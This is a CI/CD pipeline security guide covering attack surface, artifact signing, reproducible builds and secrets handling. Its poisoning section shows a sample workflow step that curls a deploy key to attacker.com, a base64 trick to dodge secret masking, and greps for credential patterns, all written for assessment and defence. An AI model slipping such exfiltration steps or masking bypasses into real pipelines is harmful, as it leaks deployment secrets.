# Build Pipeline Security Guide

> Techniques for assessing CI/CD pipeline security including poisoning attacks, artifact integrity verification, reproducible builds, and secrets management in build systems.

---

## 1. CI/CD Pipeline Attack Surface

Build pipelines are high-value targets because they have access to secrets, signing keys, and deployment credentials. Compromising the pipeline means compromising all downstream artifacts.

```yaml
# Common CI/CD attack vectors mapped to pipeline stages
attack_surface:
  source:
    - "Malicious pull request with CI script modification"
    - "Compromised developer credentials"
    - "Branch protection bypass"
    
  build:
    - "Dependency confusion during install"
    - "Malicious build scripts in dependencies"
    - "Build environment escape"
    
  artifacts:
    - "Artifact registry poisoning"
    - "Tag/digest manipulation"
    - "Missing signature verification"
    
  deploy:
    - "Secrets exfiltration from environment"
    - "Deployment credential theft"
    - "Infrastructure-as-code manipulation"
```

```bash
# Audit GitHub Actions workflow files for dangerous patterns
find .github/workflows -name "*.yml" -exec grep -l "pull_request_target" {} \;
# pull_request_target runs with repo secrets - dangerous with external PRs

# Check for command injection via untrusted inputs
grep -rn '\${{.*github\.event' .github/workflows/ | grep -v "github.event.number\|github.event.pull_request.number"

# Dangerous patterns to flag:
grep -rn 'run:.*\${{' .github/workflows/  # Inline expressions in run steps
grep -rn 'uses:.*@master\|uses:.*@main' .github/workflows/  # Unpinned actions
grep -rn 'permissions:.*write-all' .github/workflows/  # Overly broad permissions
```

---

## 2. Pipeline Poisoning Techniques

```yaml
# Example: Malicious PR that modifies CI configuration
# .github/workflows/ci.yml - injected step
name: CI
on:
  pull_request_target:  # Runs with base repo secrets!
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checks out PR code
          
      # Attacker's PR modifies this file to add:
      - name: "Build"
        run: |
          # Legitimate-looking build step that exfiltrates secrets
          echo "Building project..."
          npm install && npm run build
          # Hidden exfiltration
          curl -s "https://attacker.com/collect?token=${{ secrets.DEPLOY_KEY }}" > /dev/null
```

```bash
# Test for secrets exposure in build logs
# Check if secrets are masked in output
echo "Testing secret masking..."
# In GitHub Actions, secrets should be masked with ***
# But multiline secrets or encoded secrets may leak

# Base64 encode a secret to bypass masking
echo "$SECRET_VALUE" | base64  # May not be masked in logs

# Test environment variable exposure
env | sort  # Check what's available in build environment
printenv | grep -i "token\|key\|secret\|password\|credential"

# Check if build cache is shared between branches (cache poisoning)
ls -la ~/.npm/_cacache/ 2>/dev/null
ls -la ~/.cache/pip/ 2>/dev/null
```

---

## 3. Artifact Integrity Verification

```bash
# Sign build artifacts with cosign (Sigstore)
# Install cosign
go install github.com/sigstore/cosign/v2/cmd/cosign@latest

# Sign a container image (keyless - uses OIDC identity)
cosign sign --yes ghcr.io/company/app:v1.0.0

# Sign with a key pair
cosign generate-key-pair
cosign sign --key cosign.key ghcr.io/company/app:v1.0.0

# Verify signature before deployment
cosign verify --key cosign.pub ghcr.io/company/app:v1.0.0

# Verify keyless signature (checks Fulcio certificate + Rekor transparency log)
cosign verify \
  --certificate-identity "ci@company.com" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  ghcr.io/company/app:v1.0.0
```

```bash
# Generate and verify SLSA provenance
# Using slsa-verifier
slsa-verifier verify-artifact artifact.tar.gz \
  --provenance-path provenance.intoto.jsonl \
  --source-uri github.com/company/repo \
  --source-tag v1.0.0

# Check provenance attestation on container image
cosign verify-attestation \
  --type slsaprovenance \
  --certificate-identity "https://github.com/company/repo/.github/workflows/release.yml@refs/tags/v1.0.0" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  ghcr.io/company/app:v1.0.0
```

---

## 4. Reproducible Builds

```bash
# Verify build reproducibility - same source should produce identical artifacts
# Build twice and compare checksums

# Build 1
docker build --no-cache -t app:build1 .
docker save app:build1 | sha256sum

# Build 2 (same source, different time)
docker build --no-cache -t app:build2 .
docker save app:build2 | sha256sum

# For reproducible Docker builds, pin everything:
cat > Dockerfile << 'EOF'
# Pin base image by digest (not tag)
FROM node:20.11.0-alpine@sha256:abc123...

# Pin package versions exactly
RUN apk add --no-cache curl=8.5.0-r0

# Copy lockfile first for deterministic installs
COPY package-lock.json ./
RUN npm ci --ignore-scripts

# Set deterministic timestamps
ENV SOURCE_DATE_EPOCH=1700000000
COPY . .
RUN npm run build
EOF
```

```python
# Verify artifact checksums against expected values
import hashlib
import json
import sys

def verify_artifact(artifact_path, expected_checksums):
    """Verify artifact integrity against known-good checksums."""
    results = {}
    
    with open(artifact_path, "rb") as f:
        content = f.read()
    
    algorithms = {
        "sha256": hashlib.sha256,
        "sha512": hashlib.sha512,
        "md5": hashlib.md5,
    }
    
    for algo, expected in expected_checksums.items():
        if algo in algorithms:
            actual = algorithms[algo](content).hexdigest()
            match = actual == expected
            results[algo] = {
                "expected": expected,
                "actual": actual,
                "match": match,
            }
            status = "PASS" if match else "FAIL"
            print(f"[{status}] {algo}: {actual[:16]}...")
    
    all_pass = all(r["match"] for r in results.values())
    if not all_pass:
        print("INTEGRITY CHECK FAILED - artifact may be tampered")
        sys.exit(1)
    
    return results

verify_artifact("release.tar.gz", {
    "sha256": "expected_sha256_hash_here",
    "sha512": "expected_sha512_hash_here",
})
```

---

## 5. Secrets Management in Pipelines

```yaml
# GitHub Actions - secure secrets handling
name: Deploy
on:
  push:
    branches: [main]

permissions:
  contents: read
  id-token: write  # For OIDC-based auth (no long-lived secrets)

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production  # Requires approval
    steps:
      - uses: actions/checkout@v4
      
      # Use OIDC instead of static credentials
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/deploy-role
          aws-region: us-east-1
          # No access key/secret key needed
          
      # Secrets should never appear in logs
      - name: Deploy
        run: |
          # WRONG: echo "${{ secrets.API_KEY }}"
          # RIGHT: Use secret directly in commands
          aws s3 sync ./dist s3://bucket/ --quiet
        env:
          API_KEY: ${{ secrets.API_KEY }}  # Passed as env var, not inline
```

```bash
# Audit for secrets in CI/CD configuration
# Check for hardcoded secrets in workflow files
grep -rn "password\|secret\|token\|key" .github/workflows/ | grep -v "\${{" | grep -v "^#"

# Check for secrets in build scripts
grep -rn "AKIA\|sk_live\|ghp_\|glpat-" scripts/ Makefile Dockerfile

# Verify secrets are not cached in build layers
docker history --no-trunc app:latest | grep -i "secret\|token\|key\|password"

# Check if .env files are excluded from builds
grep ".env" .dockerignore || echo "WARNING: .env not in .dockerignore"
grep ".env" .gitignore || echo "WARNING: .env not in .gitignore"
```

---

## 6. Pipeline Security Checklist

```yaml
# CI/CD security assessment checklist
pipeline_security:
  source_control:
    - branch_protection_enabled: true
    - require_signed_commits: true
    - require_pr_reviews: true
    - dismiss_stale_reviews: true
    - restrict_force_push: true
    
  workflow_security:
    - actions_pinned_by_sha: true  # Not @v1, use @sha256:abc...
    - minimal_permissions: true     # Not write-all
    - no_pull_request_target_with_checkout: true
    - secrets_not_in_logs: true
    - environment_protection_rules: true
    
  artifact_integrity:
    - artifacts_signed: true
    - provenance_generated: true
    - checksums_published: true
    - reproducible_builds: true
    
  secrets_management:
    - oidc_over_static_credentials: true
    - secrets_rotated_regularly: true
    - least_privilege_access: true
    - no_secrets_in_code_or_config: true
```

Build pipeline security requires defense in depth. A single compromised step can undermine the entire software delivery process. Verify integrity at every stage from source to deployment.
